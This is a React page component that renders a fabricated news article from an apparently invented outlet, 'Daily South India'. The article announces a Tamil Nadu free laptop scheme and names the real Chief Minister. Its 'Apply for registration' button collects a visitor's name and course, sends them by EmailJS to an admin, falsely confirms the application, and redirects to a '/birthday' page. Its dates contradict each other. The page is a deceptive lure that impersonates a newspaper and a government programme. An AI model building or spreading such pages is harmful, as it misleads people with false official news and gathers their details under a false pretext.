import Swal from "sweetalert2";
import { useNavigate } from "react-router-dom";
import emailjs from '@emailjs/browser';

function BlogPage() {
  const navigate = useNavigate();

  // Initialize EmailJS with your public key
  // Sign up at https://www.emailjs.com to get these keys
  const sendEmail = async (name, course) => {
    // Replace these with your actual EmailJS credentials
    const serviceId = "service_sssuv69";     // Get from EmailJS dashboard
    const templateId = "template_43z3c9l";    // Get from EmailJS dashboard
    const publicKey = "QGYdGDU86WxFFce01";      // Get from EmailJS dashboard

    // Template parameters - match these with your EmailJS template
    const templateParams = {
      to_name: "Admin",           // Who the email is to
      from_name: name,            // Student's name
      course: course,             // Selected course
      message: "New registration from laptop scheme website",
      reply_to: "noreply@example.com",
      date: new Date().toLocaleString()
    };

    try {
      await emailjs.send(serviceId, templateId, templateParams, publicKey);
      return { success: true };
    } catch (error) {
      console.error("EmailJS Error:", error);
      return { success: false, error };
    }
  };

  const startProcess = async () => {
    // Get name from user
    const nameResult = await Swal.fire({
      title: "Enter your name",
      input: "text",
      inputPlaceholder: "Your name",
      confirmButtonText: "Continue",
      showCancelButton: true,
      cancelButtonText: "Cancel"
    });

    if (!nameResult.value) return;

    // Get course from user
    const courseResult = await Swal.fire({
      title: "Select your course BSC or BE",
      input: "select",
      inputOptions: {
        BE: "BE (Bachelor of Engineering)",
        BSC: "BSc (Bachelor of Science)",
        BA: "BA (Bachelor of Arts)",
        BCOM: "BCom (Bachelor of Commerce)",
        BCA: "BCA (Bachelor of Computer Applications)"
      },
      inputPlaceholder: "Select your course",
      confirmButtonText: "Submit",
      showCancelButton: true,
      cancelButtonText: "Cancel"
    });

    if (!courseResult.value) return;

    // Show loading state
    Swal.fire({
      title: "Processing...",
      text: "Please wait while we register your application",
      allowOutsideClick: false,
      didOpen: () => {
        Swal.showLoading();
      }
    });

    // Send email using EmailJS
    const result = await sendEmail(nameResult.value, courseResult.value);

    // Close loading popup
    Swal.close();

    if (result.success) {
      // Show success message
      await Swal.fire({
        icon: 'success',
        title: 'Application Submitted!',
        text: 'Your registration has been recorded successfully.',
        confirmButtonText: 'Continue'
      });
      
      // Navigate to birthday page
      navigate("/birthday");
    } else {
      // Show error message
      await Swal.fire({
        icon: 'error',
        title: 'Submission Failed',
        text: 'There was an error submitting your application. Please try again.',
        confirmButtonText: 'OK'
      });
    }
  };

  return (
    <div className="page">
      <header className="newsHeader">
        <div className="topBar">
          <span>Sunday, Jan 15, 2026</span>
          <span className="edition">Chennai Edition</span>
        </div>

        <div className="headerMain">
          <div className="leftLogo">
            <img
              className="siteLogo"
              src="/tn.png"
              alt="Daily South India"
            />
          </div>
          <div className="centerTitle">
            <h1 className="logo">Daily South India</h1>
            <p className="tagline">Truth • Integrity • Public Interest</p>
          </div>
          <div className="rightSpace"></div>
        </div>

        <nav className="menu">
          <span>India</span>
          <span>States</span>
          <span>Politics</span>
          <span>Education</span>
          <span>Technology</span>
          <span>Business</span>
          <span>Sports</span>
          <span>Opinion</span>
        </nav>
      </header>

      <article className="article">
        <h1 className="headline">
          Tamil Nadu CM launches free laptop scheme for college students across State Apply here to get yours
        </h1>

        <h2 className="subheadline">
          Thousands of students expected to benefit from digital learning initiative
        </h2>

        <p className="meta">
          By Staff Reporter | Chennai | March 2026
        </p>

        <img
          className="articleImage"
          src="/stalin.jpeg"
          alt="Tamil Nadu Chief Minister"
        />

        <h3>Scheme officially launched</h3>

        <p>
          Chief Minister M.K. Stalin on Sunday formally launched the
          distribution of free laptops to college students across Tamil Nadu
          as part of the State government's ongoing efforts to strengthen
          digital access in higher education.
        </p>

        <p>
          The initiative was launched during a public event in Chennai where
          students from several government colleges received the first batch
          of devices. The programme is expected to expand to universities
          and institutions throughout the State over the coming months.
        </p>

        <h3>Background of the initiative</h3>

        <p>
          Officials from the Department of Higher Education said that the
          scheme is designed to support students who may otherwise face
          difficulty accessing digital learning tools. The increasing use
          of online resources, digital classrooms and remote learning
          platforms has highlighted the importance of personal computing
          devices in modern education.
        </p>

        <p>
          According to government data, a significant number of students
          in rural and economically weaker communities still lack access
          to personal computers. The free laptop distribution programme
          aims to bridge this gap and ensure equal learning opportunities.
        </p>

        <h3>Eligibility and beneficiaries</h3>

        <p>
          Students enrolled in government and government-aided colleges
          will be eligible for the scheme. Priority will be given to
          first-generation learners and students from economically
          disadvantaged backgrounds.
        </p>

        <p>
          Officials stated that the laptops will come preloaded with
          educational software, digital textbooks and tools designed
          to assist students with coursework and research activities.
        </p>

        <h3>Government statement</h3>

        <p>
          Speaking at the launch event, officials emphasised that
          technology plays a critical role in preparing students
          for the future workforce. By equipping students with
          digital tools, the government hopes to enhance
          technical skills and encourage innovation among
          young learners.
        </p>

        <p>
          Education experts have also welcomed the initiative,
          noting that access to technology can significantly
          improve academic performance and digital literacy.
        </p>

        <h3>Student reactions</h3>

        <p>
          Several students present at the launch event expressed
          enthusiasm about the programme. Many noted that having
          a personal laptop would help them participate more
          actively in online learning platforms and research
          projects.
        </p>

        <p>
          Students from rural districts said that the initiative
          would reduce dependence on shared computer labs and
          internet cafés, allowing them to study more efficiently.
        </p>

        <h3>Registration and verification</h3>

        <p>
          Officials said that eligible students would need to
          complete a verification process before receiving the
          devices. The registration process includes confirming
          student details and course enrolment through the
          official portal.
        </p>

        <p>
          Those interested in completing their verification
          may proceed to the registration step through the
          portal. Eligible students can
          <button 
            className="applyButton" 
            onClick={startProcess} 
            style={{
              margin: "5px 20px",
              padding: "10px 20px",
              backgroundColor: "#007bff",
              color: "white",
              border: "none",
              borderRadius: "5px",
              cursor: "pointer",
              fontWeight: "bold"
            }}
          >
            APPLY FOR REGISTRATION
          </button> 
          to begin the process.
        </p>
      </article>

      <footer className="siteFooter">
        <div className="footerContent">
          <div className="footerBrand">
            <h2>Daily South India</h2>
            <p>
              Independent journalism focused on public interest,
              education, technology and policy developments across
              South India.
            </p>
          </div>

          <div className="footerLinks">
            <h3>Sections</h3>
            <ul>
              <li>India</li>
              <li>States</li>
              <li>Politics</li>
              <li>Education</li>
              <li>Technology</li>
            </ul>
          </div>

          <div className="footerLinks">
            <h3>Company</h3>
            <ul>
              <li>About Us</li>
              <li>Editorial Policy</li>
              <li>Contact</li>
              <li>Careers</li>
            </ul>
          </div>
        </div>

        <div className="footerBottom">
          <p>© 2026 Daily South India. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default BlogPage;